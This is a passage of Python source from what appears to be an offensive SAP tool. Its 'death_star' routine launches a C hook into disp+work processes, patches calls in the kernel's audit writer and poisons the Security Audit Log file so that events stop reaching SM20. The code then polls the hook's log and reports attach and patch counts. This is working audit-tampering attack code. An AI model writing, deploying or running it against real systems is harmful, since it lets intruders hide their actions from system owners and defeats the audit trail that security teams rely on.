            print(f"[!] {node.sid}: death_star: worker enumeration "
                   f"failed ({e}); the C hook will still auto-attach")
            target_comm = "(auto-attach to all work-processes)"
        # Signal launch() to omit ``--pid`` — Julian's hook then walks
        # /proc itself and hooks every disp+work.
        target_pid = None
    else:
        target_comm = f"(operator-supplied PID {target_pid})"

    # Auto-discover the SAL file so the hook can inotify-poison it too.
    # On DB-only recording targets returns None; the hook then runs
    # without --audit-file (nothing to poison on the FS side).
    audit_file = _discover_audit_file(node, node.sid,
                                        remote_dir=remote_dir)

    hook_pid = launch(node, binary_path, target_pid,
                       filter_classes=filter_classes,
                       verbose=verbose,
                       log_path=log_path,
                       pidfile_path=pidfile_path,
                       audit_file=audit_file,
                       remote_dir=remote_dir)

    # Post-arm log dump — critical diagnostic surface.  Julian's C
    # hook writes both attach/plant errors and (with -v) every audit
    # record it sees to this log.  If the runtime scan can't find
    # hook sites in this build of disp+work, ``plant_bp`` refuses to
    # patch (its ``0xE8`` sanity check protects against corrupting
    # unrelated bytes) — and those refusals only surface via the log.
    # Auto-dumping saves the operator a manual ``cat`` on the target
    # to figure out why SM20 still shows events.
    #
    # Poll ``wc -c`` up to 5x with a 2 s gap between attempts before
    # giving up.  Previous single-shot 3 s wait produced a false
    # "log is empty" report on SUSE targets even when the hook had
    # already written its startup banner + attach lines — SXPG's read
    # side lagged behind the kernel page cache by a few seconds.
    import time as _time
    log_tail: list = []
    for attempt in range(5):
        _time.sleep(2)
        _wc = _run(node, "wc", f"-c {log_path}",
                    label=f"post-arm log size check "
                          f"(attempt {attempt + 1}/5)")
        size = 0
        for line in _wc.get("output") or []:
            parts = line.strip().split()
            if parts and parts[0].isdigit():
                size = int(parts[0])
                break
        if size > 0:
            log_tail = read_hook_log(node, log_path, max_lines=60)
            if log_tail:
                break
        print(f"[*] {node.sid}: death_star: log at {log_path} is still "
               f"empty ({size} B) after {(attempt + 1) * 2}s — waiting")
    attach_ok = sum(1 for ln in log_tail if "attached pid" in ln)
    plant_fails = sum(1 for ln in log_tail
                       if "failed to plant" in ln or "expected CALL" in ln)
    if log_tail:
        print(f"[*] {node.sid}: death_star: hook log ({log_path}) — "
              f"{len(log_tail)} line(s), {attach_ok} attach OK, "
              f"{plant_fails} plant warning(s):")
        for ln in log_tail:
            print(f"[*] {node.sid}: death_star:   log: {ln[:200]}")
        if plant_fails > 0:
            print(f"[!] {node.sid}: death_star: {plant_fails} hook site(s) "
                   f"could not be planted — the hook is attached but is "
                   f"NOT intercepting those SAL sinks.  Audit events "
                   f"routed through the un-planted paths will still land "
                   f"in SM20.  This usually means the C hook's runtime "
                   f"address scan didn't recognise this kernel build's "
                   f"``rsauwr1ex`` layout.")
    else:
        print(f"[*] {node.sid}: death_star: hook log at {log_path} is "
               f"still empty after 10s of polling — the hook may be "
               f"running silently or SXPG is caching the read.  Check "
               f"the target directly with ``ls -la {log_path}`` and "
               f"``cat {log_path}``.")

    return {
        "ok": True,
        "mode": mode,
        "source_path": source_path if mode == "compile" else "",
        "binary_path": binary_path,
        "target_pid": target_pid,          # None → auto-attach to all
        "target_comm": target_comm,
        "workers_hooked": workers_seen,    # 0 when target_pid was given
        "hook_pid": hook_pid,
        "log_path": log_path,
        "pidfile_path": pidfile_path,
        "audit_file": audit_file,          # None → DB-only recording
        "filter_classes": filter_classes,
        "log_tail": log_tail,
        "attach_ok_count": attach_ok,
        "plant_fails_count": plant_fails,
    }
